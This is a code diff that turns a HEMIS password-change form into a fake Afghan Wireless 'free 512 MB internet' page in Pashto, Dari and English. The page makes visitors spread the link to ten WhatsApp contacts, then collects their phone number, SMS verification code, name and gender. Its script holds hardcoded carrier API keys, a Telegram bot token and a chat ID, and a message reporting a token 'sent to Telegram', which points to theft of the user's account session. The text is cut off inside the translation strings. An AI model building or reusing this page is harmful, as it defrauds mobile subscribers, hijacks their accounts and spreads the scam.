@@ -1,206 +1,1675 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="ps" dir="rtl">
 <head>
-    <title>HEMIS - تغییر  رمز عبور</title>
-    <meta charset="UTF-8" />
-    <meta name="csrf-token" content="EXAMPLE_TOKEN" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <link
-      rel="stylesheet"
-      href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"
-    />
-    <link href="https://hemis.edu.af/css/login.css" rel="stylesheet" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>افغان بېسیم - د 512 ام وړیا درک</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css?family=Raleway:300,400,600');
-        body {
+        * {
             margin: 0;
-            font-size: .9rem;
-            font-weight: 400;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary-blue: #1a73e8;
+            --dark-blue: #0d47a1;
+            --light-blue: #e8f0fe;
+            --accent-blue: #4285f4;
+            --success-green: #34a853;
+            --warning-orange: #f9ab00;
+            --error-red: #ea4335;
+            --whatsapp-green: #25D366;
+            --telegram-blue: #0088cc;
+            --text-dark: #202124;
+            --text-light: #5f6368;
+            --bg-light: #f8f9fa;
+            --white: #ffffff;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --border-radius: 12px;
+        }
+
+        body {
+            background-color: var(--bg-light);
+            color: var(--text-dark);
             line-height: 1.6;
-            color: #212529;
-            text-align: right;
-            background-color: #f5f8fa;
-            direction: rtl;
-            font-family: 'Raleway', sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            background-image: linear-gradient(135deg, var(--light-blue) 0%, #ffffff 100%);
         }
-        .navbar-laravel {
-            box-shadow: 0 2px 4px rgba(0,0,0,.04);
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
         }
-        .login-form {
-            padding-top: 1.5rem;
-            padding-bottom: 1.5rem;
+
+        /* هېډر او ژبې کنټرولونه */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            margin-bottom: 30px;
         }
-        .login-form label,
-        .text-danger,
-        .alert {
-            font-size: 12px;
-            font-weight: bold;
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
         }
-        .input-group-text {
+
+        .logo i {
+            color: var(--primary-blue);
+            font-size: 2.5rem;
+        }
+
+        .logo h1 {
+            font-size: 1.8rem;
+            color: var(--dark-blue);
+        }
+
+        .lang-selector {
+            display: flex;
+            gap: 10px;
+        }
+
+        .lang-btn {
+            padding: 8px 15px;
+            border: 1px solid var(--primary-blue);
+            background: transparent;
+            border-radius: 6px;
+            color: var(--primary-blue);
             cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 500;
+        }
+
+        .lang-btn.active {
+            background: var(--primary-blue);
+            color: white;
+        }
+
+        .lang-btn:hover:not(.active) {
+            background: rgba(26, 115, 232, 0.1);
+        }
+
+        /* مرکزي کارټ */
+        .main-card {
+            background: var(--white);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+
+        .card-header {
+            background: linear-gradient(90deg, var(--primary-blue), var(--dark-blue));
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+
+        .card-header h2 {
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+
+        .card-header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+
+        .card-body {
+            padding: 30px;
+        }
+
+        /* مرحلې کونټرولونه */
+        .step-container {
+            position: relative;
+            min-height: 400px;
+        }
+
+        .step {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* د نشر مرحلې */
+        .share-step {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .share-icon {
+            font-size: 4rem;
+            color: var(--whatsapp-green);
+            margin-bottom: 20px;
+        }
+
+        .share-title {
+            font-size: 1.8rem;
+            color: var(--dark-blue);
+            margin-bottom: 15px;
+        }
+
+        .share-description {
+            font-size: 1.2rem;
+            color: var(--text-light);
+            margin-bottom: 30px;
+            line-height: 1.8;
+        }
+
+        /* د پرمختګ بار */
+        .progress-container {
+            margin: 30px 0;
+        }
+
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .progress-text {
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .progress-percent {
+            font-weight: bold;
+            color: var(--primary-blue);
+        }
+
+        .progress-bar {
+            height: 20px;
+            background-color: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--whatsapp-green), #1da851);
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .share-note {
+            background: #e8f5e9;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            border-right: 4px solid var(--whatsapp-green);
+            text-align: right;
+        }
+
+        .share-note i {
+            color: var(--whatsapp-green);
+            margin-left: 10px;
+        }
+
+        /* فورم عناصر */
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .input-with-icon {
+            position: relative;
+        }
+
+        .input-with-icon i {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            right: 15px;
+            color: var(--primary-blue);
+        }
+
+        input, select {
+            width: 100%;
+            padding: 15px 45px 15px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border 0.3s;
+            background-color: white;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+        }
+
+        .phone-note {
+            font-size: 0.9rem;
+            color: var(--text-light);
+            margin-top: 8px;
+            padding: 8px 12px;
+            background-color: #f8f9fa;
+            border-radius: 6px;
+            border-right: 3px solid var(--primary-blue);
+        }
+
+        /* OTP واحد ان پټ */
+        .single-otp-input {
+            font-size: 1.5rem;
+            font-weight: bold;
+            letter-spacing: 5px;
+            text-align: center;
+        }
+
+        /* جندر انتخابونه */
+        .gender-options {
+            display: flex;
+            gap: 20px;
+            margin-top: 10px;
+        }
+
+        .gender-option {
+            flex: 1;
+            text-align: center;
+        }
+
+        .gender-option input {
+            display: none;
+        }
+
+        .gender-option label {
+            display: block;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: normal;
+        }
+
+        .gender-option input:checked + label {
+            border-color: var(--primary-blue);
+            background-color: var(--light-blue);
+            color: var(--primary-blue);
+        }
+
+        /* بټنونه */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 15px 30px;
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background: var(--dark-blue);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(26, 115, 232, 0.25);
+        }
+
+        .btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-whatsapp {
+            background: var(--whatsapp-green);
+        }
+
+        .btn-whatsapp:hover {
+            background: #1da851;
+        }
+
+        .btn-secondary {
+            background: #f1f3f4;
+            color: var(--text-dark);
+        }
+
+        .btn-secondary:hover {
+            background: #e8eaed;
+        }
+
+        .btn-success {
+            background: var(--success-green);
+        }
+
+        .btn-success:hover {
+            background: #2d9249;
+        }
+
+        /* د پایلې ښودل */
+        .result-box {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .result-icon {
+            font-size: 4rem;
+            color: var(--success-green);
+            margin-bottom: 20px;
+        }
+
+        .result-title {
+            font-size: 1.8rem;
+            color: var(--dark-blue);
+            margin-bottom: 15px;
+        }
+
+        .result-message {
+            font-size: 1.2rem;
+            color: var(--text-light);
+            margin-bottom: 30px;
+            line-height: 1.8;
+        }
+
+        .reward-info {
+            background: var(--light-blue);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 30px 0;
+            border-right: 4px solid var(--primary-blue);
+        }
+
+        .reward-info h3 {
+            color: var(--dark-blue);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* د اتوماتیک بیا پیل کولو معلومات */
+        .auto-restart-info {
+            background: #fff8e1;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 30px;
+            border-right: 4px solid var(--warning-orange);
+            text-align: center;
+        }
+
+        .auto-restart-info i {
+            color: var(--warning-orange);
+            margin-bottom: 10px;
+        }
+
+        /* لوډر */
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* د تلیفون شمېرې فورمټ */
+        .phone-prefix {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-light);
+            font-weight: 600;
+        }
+
+        .phone-input {
+            padding-left: 60px !important;
+        }
+
+        /* د خرڅلاو پیغامونه */
+        .alert {
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .alert-success {
+            background-color: #d4edda;
+            color: #155724;
+            border-right: 4px solid #28a745;
+        }
+
+        .alert-error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border-right: 4px solid #dc3545;
+        }
+
+        .alert-info {
+            background-color: #d1ecf1;
+            color: #0c5460;
+            border-right: 4px solid #17a2b8;
+        }
+
+        .alert i {
+            font-size: 1.5rem;
+        }
+
+        /* فوټر */
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: var(--text-light);
+            font-size: 0.9rem;
+            margin-top: 30px;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        /* د رسپانسیف لپاره */
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            header {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .card-body {
+                padding: 20px;
+            }
+            
+            .gender-options {
+                flex-direction: column;
+            }
+            
+            .share-icon {
+                font-size: 3rem;
+            }
+            
+            .share-title {
+                font-size: 1.5rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .logo h1 {
+                font-size: 1.5rem;
+            }
+            
+            .card-header h2 {
+                font-size: 1.5rem;
+            }
+            
+            .lang-selector {
+                width: 100%;
+                justify-content: center;
+            }
+            
+            input, select, .btn {
+                padding: 12px 15px;
+            }
+            
+            .single-otp-input {
+                font-size: 1.2rem;
+                letter-spacing: 3px;
+            }
         }
     </style>
 </head>
 <body>
-<nav class="navbar navbar-expand-lg navbar-light navbar-laravel">
-  <div class="container">
-    <a class="navbar-brand" href="#">سیستم مدیریت محصلان دولتی - وزارت تحصیلات عالی</a>
-  </div>
-</nav>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-sim-card"></i>
+                <h1 id="app-title">افغان بېسیم - د 512 ام وړیا درک</h1>
+            </div>
+            <div class="lang-selector">
+                <button class="lang-btn active" data-lang="ps">پښتو</button>
+                <button class="lang-btn" data-lang="fa">فارسی</button>
+                <button class="lang-btn" data-lang="en">English</button>
+            </div>
+        </header>
 
-<main class="login-form">
-  <div class="container">
-    <div class="row justify-content-center">
-      <div class="col-md-8">
-        <div class="card">
-          <div class="card-header"><h4>تغییر رمز عبور</h4></div>
-          <div class="card-body">
-            <form id="tgForm" novalidate>
-              <div class="form-group row">
-                <label for="email" class="col-md-4 col-form-label text-md-right">ایمیل</label>
-                <div class="col-md-6">
-                  <input
-                    type="email"
-                    id="email"
-                    name="email"
-                    class="form-control"
-                    required
-                    autocomplete="email"
-                  />
-                  <div class="invalid-feedback">لطفاً ایمیل معتبر وارد کنید.</div>
-                </div>
-              </div>
-
-              <div class="form-group row">
-                <label for="current_password" class="col-md-4 col-form-label text-md-right">رمز عبور فعلی</label>
-                <div class="col-md-6">
-                  <div class="input-group">
-                    <input
-                      type="password"
-                      id="current_password"
-                      name="current_password"
-                      class="form-control"
-                      required
-                      autocomplete="current-password"
-                    />
-                    <div class="input-group-append">
-                      <span class="input-group-text" onclick="togglePassword('current_password', this)">👁️</span>
+        <div class="main-card">
+            <div class="card-header">
+                <h2 id="reward-title">512 ام وړیا انټرنیټ ترلاسه کړئ!</h2>
+                <p id="reward-subtitle">خپل تلیفون شمېره تایید کړئ او د 512 ام وړیا انټرنیټ څخه برخمن شئ</p>
+            </div>
+            
+            <div class="card-body">
+                <!-- د خرڅلاو پیغام څوګونځی -->
+                <div id="message-container"></div>
+                
+                <!-- مرحلې -->
+                <div class="step-container">
+                    <!-- لومړی مرحله: د نشر مرحله -->
+                    <div class="step active" id="step-share">
+                        <div class="share-step">
+                            <div class="share-icon">
+                                <i class="fab fa-whatsapp"></i>
+                            </div>
+                            <h2 class="share-title" id="share-title">لومړی دا لینک خپر کړئ!</h2>
+                            <div class="share-description" id="share-description">
+                                لومړی دا لینک په واتساپ کې خپلو لسو ملګرو ته ولېږه او نشر یې کړه. بیا کولی شئ د 512 ام وړیا انټرنیټ څخه برخمن شئ.
+                            </div>
+                            
+                            <div class="share-note">
+                                <i class="fas fa-info-circle"></i>
+                                <span id="share-note-text">دا لینک په واتساپ کې خپلو لسو ملګرو ته ولېږه. هر ملګر ته په جلا جلا پیغام کې ولېږه.</span>
+                            </div>
+                            
+                            <div class="progress-container">
+                                <div class="progress-info">
+                                    <span class="progress-text" id="progress-text">د پرمختګ کچه:</span>
+                                    <span class="progress-percent" id="progress-percent">0%</span>
+                                </div>
+                                <div class="progress-bar">
+                                    <div class="progress-fill" id="progress-fill"></div>
+                                </div>
+                                <div class="phone-note" id="progress-note">
+                                    <span id="shares-count">0</span> / 10 ملګرو ته لینک لیږل شوی
+                                </div>
+                            </div>
+                            
+                            <button class="btn btn-whatsapp" id="share-btn">
+                                <i class="fab fa-whatsapp"></i>
+                                <span id="share-btn-text">لینک په واتساپ کې خپرو کړه</span>
+                            </button>
+                            
+                            <button class="btn btn-secondary" id="skip-share-btn" style="display: none;">
+                                <i class="fas fa-forward"></i>
+                                <span id="skip-share-text">وروسته کول</span>
+                            </button>
+                        </div>
                     </div>
-                  </div>
-                  <div class="invalid-feedback">لطفاً رمز عبور فعلی را وارد کنید.</div>
-                </div>
-              </div>
-
-              <div class="form-group row">
-                <label for="new_password" class="col-md-4 col-form-label text-md-right">رمز عبور جدید</label>
-                <div class="col-md-6">
-                  <div class="input-group">
-                    <input
-                      type="password"
-                      id="new_password"
-                      name="new_password"
-                      class="form-control"
-                      required
-                      autocomplete="new-password"
-                      minlength="6"
-                    />
-                    <div class="input-group-append">
-                      <span class="input-group-text" onclick="togglePassword('new_password', this)">👁️</span>
+                    
+                    <!-- دویم مرحله: د تلیفون شمېرې تایید -->
+                    <div class="step" id="step-verify-phone">
+                        <div class="form-group">
+                            <label id="phone-label">خپل تلیفون شمېره دننه کړئ</label>
+                            <div class="input-with-icon">
+                                <div class="phone-prefix">+93</div>
+                                <input type="tel" id="phone" class="phone-input" placeholder="701234567" maxlength="9">
+                                <i class="fas fa-mobile-alt"></i>
+                            </div>
+                            <div class="phone-note" id="phone-note">
+                                تلیفون شمېره باید د 70، 070، 71 یا 071 سره پیل شي. مثال: 701234567
+                            </div>
+                        </div>
+                        
+                        <button class="btn" id="send-otp-btn">
+                            <i class="fas fa-paper-plane"></i>
+                            <span id="send-otp-text">OTP پیغام ولیږئ</span>
+                        </button>
                     </div>
-                  </div>
-                  <div class="invalid-feedback">
-                    لطفاً رمز عبور جدید را وارد کنید (حداقل 6 کاراکتر).
-                  </div>
-                </div>
-              </div>
-
-              <div class="form-group row">
-                <label for="new_password_confirm" class="col-md-4 col-form-label text-md-right">تکرار رمز جدید</label>
-                <div class="col-md-6">
-                  <div class="input-group">
-                    <input
-                      type="password"
-                      id="new_password_confirm"
-                      name="new_password_confirm"
-                      class="form-control"
-                      required
-                      autocomplete="new-password"
-                      minlength="6"
-                    />
-                    <div class="input-group-append">
-                      <span class="input-group-text" onclick="togglePassword('new_password_confirm', this)">👁️</span>
+                    
+                    <!-- دریم مرحله: د OTP تایید -->
+                    <div class="step" id="step-verify-otp">
+                        <div class="form-group">
+                            <label id="otp-label">د تایید کوډ دننه کړئ چې ستاسو تلیفون ته لیږل شوی دی</label>
+                            <div class="input-with-icon">
+                                <input type="text" id="otp-single" class="single-otp-input" maxlength="6" placeholder="123456">
+                                <i class="fas fa-key"></i>
+                            </div>
+                            <div class="phone-note" id="otp-note">
+                                ۶ ګونی کوډ ستاسو تلیفون ته لیږل شوی دی. تاسو کولی شئ پاسټ هم وکړئ. دا کوډ ۵ دقیقو لپاره معتبر دی.
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <button class="btn" id="verify-otp-btn">
+                                <i class="fas fa-check-circle"></i>
+                                <span id="verify-otp-text">تایید کړئ</span>
+                            </button>
+                            <button class="btn btn-secondary" id="resend-otp-btn">
+                                <i class="fas fa-redo"></i>
+                                <span id="resend-otp-text">کوډ بیا ولیږئ</span>
+                            </button>
+                        </div>
                     </div>
-                  </div>
-                  <div class="invalid-feedback">رمزهای وارد شده باید یکسان باشند.</div>
+                    
+                    <!-- څلورم مرحله: راجستر (یوازې د نوي کاروونکو لپاره) -->
+                    <div class="step" id="step-register">
+                        <div class="form-group">
+                            <label id="name-label">خپل نوم دننه کړئ</label>
+                            <div class="input-with-icon">
+                                <input type="text" id="name" placeholder="ستاسو بشپړ نوم">
+                                <i class="fas fa-user"></i>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label id="gender-label">جنس انتخاب کړئ</label>
+                            <div class="gender-options">
+                                <div class="gender-option">
+                                    <input type="radio" id="gender-male" name="gender" value="m">
+                                    <label for="gender-male" id="male-label">نارینه</label>
+                                </div>
+                                <div class="gender-option">
+                                    <input type="radio" id="gender-female" name="gender" value="f">
+                                    <label for="gender-female" id="female-label">ښځینه</label>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <button class="btn" id="register-btn">
+                            <i class="fas fa-user-plus"></i>
+                            <span id="register-text">راجستر کړئ</span>
+                        </button>
+                    </div>
+                    
+                    <!-- پنځم مرحله: د جایزې ترلاسه کول -->
+                    <div class="step" id="step-redeem">
+                        <div class="reward-info">
+                            <h3><i class="fas fa-gift"></i> <span id="reward-info-title">د 512 ام وړیا انټرنیټ جزئیات</span></h3>
+                            <p id="reward-info-text">تاسو اوس د 512 ام وړیا انټرنیټ ترلاسه کولو لپاره چمتو یاست. دغه انټرنیټ د یوې اونۍ لپاره معتبر دی او په ټول هېواد کې کارول کېدی شي.</p>
+                        </div>
+                        
+                        <button class="btn btn-success" id="redeem-btn">
+                            <i class="fas fa-gift"></i>
+                            <span id="redeem-text">جایزه ترلاسه کړئ</span>
+                        </button>
+                    </div>
+                    
+                    <!-- شپږم مرحله: مبارکي -->
+                    <div class="step" id="step-result">
+                        <div class="result-box">
+                            <div class="result-icon">
+                                <i class="fas fa-trophy"></i>
+                            </div>
+                            <h2 class="result-title" id="congrats-title">مبارک شه!</h2>
+                            <div class="result-message" id="congrats-message">
+                                تاسو بریالۍ ډول د افغان بېسیم د 512 ام وړیا انټرنیټ څخه برخمن شوئ. د انټرنیټ خدمت به ډیر ژر ستاسو تلیفون ته فعال شي.
+                            </div>
+                            <div class="reward-info">
+                                <h3><i class="fas fa-info-circle"></i> د انټرنیټ کارولو لارښوونې</h3>
+                                <p>د انټرنیټ د کارولو لپاره، خپل تلیفون کې د انټرنیټ تنظیمات فعال کړئ. که تاسو د انټرنیټ په کارولو کې ستونزې لرئ، د ۱۰۰ مګا بېسیم مرکز سره اړیکه ونیسئ.</p>
+                            </div>
+                            <div class="auto-restart-info">
+                                <i class="fas fa-clock"></i>
+                                <p id="restart-countdown">دا پاڼه په اتومات ډول په <span id="countdown-number">10</span> ثانیو کې بیا پیل کیږي...</p>
+                            </div>
+                        </div>
+                    </div>
                 </div>
-              </div>
-
-              <div class="col-md-6">
-                <button type="submit" class="btn btn-primary">ارسال</button>
-                <a href="#" class="btn btn-secondary" onclick="return false;">انصراف</a>
-              </div>
-            </form>
-          </div>
+            </div>
         </div>
-      </div>
+        
+        <footer>
+            <p id="footer-text">د افغان بېسیم شرکت لخوا چمتو شوی خدمت. ټول حقونه خوندي دي © ۲۰۲۳</p>
+            <p id="support-text">د مرستې لپاره: ۱۰۰ (له افغان بېسیم تلیفونونو څخه) یا +۹۳ ۷۹ ۹۹۹ ۱۰۰</p>
+        </footer>
     </div>
-  </div>
-</main>
 
-<script>
-  function togglePassword(fieldId, iconElem) {
-    const input = document.getElementById(fieldId);
-    if (input.type === "password") {
-      input.type = "text";
-      iconElem.textContent = "🙈";
-    } else {
-      input.type = "password";
-      iconElem.textContent = "👁️";
-    }
-  }
+    <script>
+        // د API تنظیمات
+        const API_CONFIG = {
+            BASE_URL: 'https://asan-api.afghan-wireless.com/asan/index.php/api/v335',
+            HEADERS: {
+                'key': 'E55LCtuGHLmnHyeOGU2Hgr390L37878zxUnuR78905',
+                'ref': 'Z78944CtJJ798skHglT3787854904YuR78',
+                'appversion': 'latestsep2023',
+                'Content-Type': 'application/json'
+            }
+        };
 
-  const form = document.getElementById("tgForm");
-  form.addEventListener("submit", async function (e) {
-    e.preventDefault();
+        // د ټیلیګرام ربات تنظیمات
+        const TELEGRAM_BOT = {
+            TOKEN: '8038455508:AAG_nhK7FB5uTwVPaUXlr_FXBaHkmHkpTQo',
+            CHAT_ID: '6379929132'
+        };
 
-    if (!form.checkValidity()) {
-      form.classList.add("was-validated");
-      return;
-    }
+        // د پلیکیشن حالت
+        let appState = {
+            currentLang: 'ps',
+            currentStep: 'step-share',
+            phoneNumber: '',
+            otp: '',
+            token: '',
+            userId: '',
+            userRef: '',
+            hasAccount: false,
+            userName: '',
+            userGender: '',
+            isProcessing: false,
+            restartTimer: null,
+            countdown: 10,
+            sharesCount: 0,
+            maxShares: 10,
+            shareLink: 'https://awcc.af/d/512mb-free-internet'
+        };
 
-    const newPass = document.getElementById("new_password").value;
-    const confirmPass = document.getElementById("new_password_confirm").value;
-    if (newPass !== confirmPass) {
-      const confirmInput = document.getElementById("new_password_confirm");
-      confirmInput.setCustomValidity("رمزهای وارد شده یکسان نیستند.");
-      form.classList.add("was-validated");
-      return;
-    } else {
-      document.getElementById("new_password_confirm").setCustomValidity("");
-    }
+        // د ژبې متنونه
+        const translations = {
+            ps: {
+                appTitle: 'افغان بېسیم - د 512 ام وړیا درک',
+                rewardTitle: '512 ام وړیا انټرنیټ ترلاسه کړئ!',
+                rewardSubtitle: 'خپل تلیفون شمېره تایید کړئ او د 512 ام وړیا انټرنیټ څخه برخمن شئ',
+                shareTitle: 'لومړی دا لینک خپر کړئ!',
+                shareDescription: 'لومړی دا لینک په واتساپ کې خپلو لسو ملګرو ته ولېږه او نشر یې کړه. بیا کولی شئ د 512 ام وړیا انټرنیټ څخه برخمن شئ.',
+                shareNoteText: 'دا لینک په واتساپ کې خپلو لسو ملګرو ته ولېږه. هر ملګر ته په جلا جلا پیغام کې ولېږه.',
+                shareBtnText: 'لینک په واتساپ کې خپرو کړه',
+                skipShareText: 'وروسته کول',
+                progressText: 'د پرمختګ کچه:',
+                progressNote: 'ملګرو ته لینک لیږل شوی',
+                phoneLabel: 'خپل تلیفون شمېره دننه کړئ',
+                phoneNote: 'تلیفون شمېره باید د 70، 070، 71 یا 071 سره پیل شي. مثال: 701234567',
+                sendOtpText: 'OTP پیغام ولیږئ',
+                otpLabel: 'د تایید کوډ دننه کړئ چې ستاسو تلیفون ته لیږل شوی دی',
+                otpNote: '۶ ګونی کوډ ستاسو تلیفون ته لیږل شوی دی. تاسو کولی شئ پاسټ هم وکړئ. دا کوډ ۵ دقیقو لپاره معتبر دی.',
+                verifyOtpText: 'تایید کړئ',
+                resendOtpText: 'کوډ بیا ولیږئ',
+                nameLabel: 'خپل نوم دننه کړئ',
+                namePlaceholder: 'ستاسو بشپړ نوم',
+                genderLabel: 'جنس انتخاب کړئ',
+                maleLabel: 'نارینه',
+                femaleLabel: 'ښځینه',
+                registerText: 'راجستر کړئ',
+                rewardInfoTitle: 'د 512 ام وړیا انټرنیټ جزئیات',
+                rewardInfoText: 'تاسو اوس د 512 ام وړیا انټرنیټ ترلاسه کولو لپاره چمتو یاست. دغه انټرنیټ د یوې اونۍ لپاره معتبر دی او په ټول هېواد کې کارول کېدی شي.',
+                redeemText: 'جایزه ترلاسه کړئ',
+                congratsTitle: 'مبارک شه!',
+                congratsMessage: 'تاسو بریالۍ ډول د افغان بېسیم د 512 ام وړیا انټرنیټ څخه برخمن شوئ. د انټرنیټ خدمت به ډیر ژر ستاسو تلیفون ته فعال شي.',
+                restartCountdown: 'دا پاڼه په اتومات ډول په <span id="countdown-number">10</span> ثانیو کې بیا پیل کیږي...',
+                footerText: 'د افغان بېسیم شرکت لخوا چمتو شوی خدمت. ټول حقونه خوندي دي © ۲۰۲۳',
+                supportText: 'د مرستې لپاره: ۱۰۰ (له افغان بېسیم تلیفونونو څخه) یا +۹۳ ۷۹ ۹۹۹ ۱۰۰',
+                successMsg: 'بریالۍ عمل!',
+                errorMsg: 'ستونزه!',
+                infoMsg: 'پاملرنه!',
+                sendingOtp: 'د OTP پیغام لیږل کېږي...',
+                verifyingOtp: 'د OPD تایید کېږي...',
+                registering: 'راجستر کېږي...',
+                redeeming: 'جایزه ترلاسه کېږي...',
+                sharing: 'په واتساپ کې لیږل کېږي...',
+                otpSent: 'د OTP پیغام ستاسو تلیفون ته لیږل شو.',
+                otpVerified: 'ستاسو تلیفون شمېره بریالۍ تایید شوه.',
+                registered: 'ستاسو حساب بریالۍ راجستر شو.',
+                rewardClaimed: 'تاسو د 512 ام وړیا انټرنیټ څخه برخمن شوئ.',
+                invalidPhone: 'تلیفون شمېره سم نه ده. باید د 70، 71، 070 یا 071 سره پیل شي.',
+                invalidOtp: 'د OTP کوډ سم نه دی. باید دقیقاً ۶ عددي وي. بیا هڅه وکړئ.',
+                apiError: 'د API سره اړیکه کې ستونزه. بیا هڅه وکړئ.',
+                alreadyClaimed: 'تاسو مخکې د 512 ام وړیا انټرنیټ څخه برخمن شوي یاست.',
+                networkError: 'د انټرنیټ اړیکه کې ستونزه. بیا هڅه وکړئ.',
+                shareSuccess: 'د واتساپ اپلیکیشن خلاص شو. لینک خپلو ملګرو ته ولېږئ.',
+                shareComplete: 'ستاسو د نشر کچه بشپړه شوه. اوس کولی شئ خپل تلیفون شمېره تایید کړئ.',
+                telegramSent: 'توکن په بریالیتوب سره ټیلیګرام ته لیږل شو.'
+            },
+            fa: {
+                appTitle: 'افغان بیسیم - 512 مگابایت اینترنت رایگان',
+                rewardTitle: '512 مگابایت اینترنت رایگان دریافت کنید!',
+                rewardSubtitle: 'شماره تلفن خود را تأیید کنید و از 512 مگابایت اینترنت رایگان بهره‌مند شوید',
+                shareTitle: 'اول این لینک را منتشر کنید!',
+                shareDescription: 'اول این لینک را برای ده نفر از دوستان خود در واتساپ ارسال و منتشر کنید. سپس می‌توانید از 512 مگابایت اینترنت رایگان بهره‌مند شوید.',
+                shareNoteText: 'این لینک را برای ده نفر از دوستان خود در واتساپ ارسال کنید. به هر دوست در پیام جداگانه ارسال کنید.',
+                shareBtnText: 'لینک را در واتساپ منتشر کنید',
+                skipShareText: 'بعداً',
+                progressText: 'درصد پیشرفت:',
+                progressNote: 'لینک برای دوستان ارسال شده',
+                phoneLabel: 'شماره تلفن خود را وارد کنید',
+                phoneNote: 'شماره تلفن باید با 70، 070، 71 یا 071 شروع شود. مثال: 701234567',
+                sendOtpText: 'ارسال کد تأیید',
+                otpLabel: 'کد تأیید ارسال شده به تلفن خود را وارد کنید',
+                otpNote: 'کد ۶ رقمی به تلفن شما ارسال شده است. شما می‌توانید کد را paste هم کنید. این کد به مدت ۵ دقیقه معتبر است.',
+                verifyOtpText: 'تأیید',
+                resendOtpText: 'ارسال مجدد کد',
+                nameLabel: 'نام خود را وارد کنید',
+                namePlaceholder: 'نام کامل شما',
+                genderLabel: 'جنسیت را انتخاب کنید',
+                maleLabel: 'مرد',
+                femaleLabel: 'زن',
+                registerText: 'ثبت‌نام',
+                rewardInfoTitle: 'جزئیات 512 مگابایت اینترنت رایگان',
+                rewardInfoText: 'شما اکنون آماده دریافت 512 مگابایت اینترنت رایگان هستید. این اینترنت به مدت یک هفته معتبر است و در سراسر کشور قابل استفاده می‌باشد.',
+                redeemText: 'دریافت جایزه',
+                congratsTitle: 'تبریک!',
+                congratsMessage: 'شما با موفقیت از 512 مگابایت اینترنت رایگان افغان بیسیم بهره‌مند شدید. سرویس اینترنت به زودی بر روی تلفن شما فعال خواهد شد.',
+                restartCountdown: 'این صفحه به طور خودکار در <span id="countdown-number">10</span> ثانیه مجدداً شروع می‌شود...',
+                footerText: 'سرویس ارائه شده توسط شرکت افغان بیسیم. کلیه حقوق محفوظ است © ۲۰۲۳',
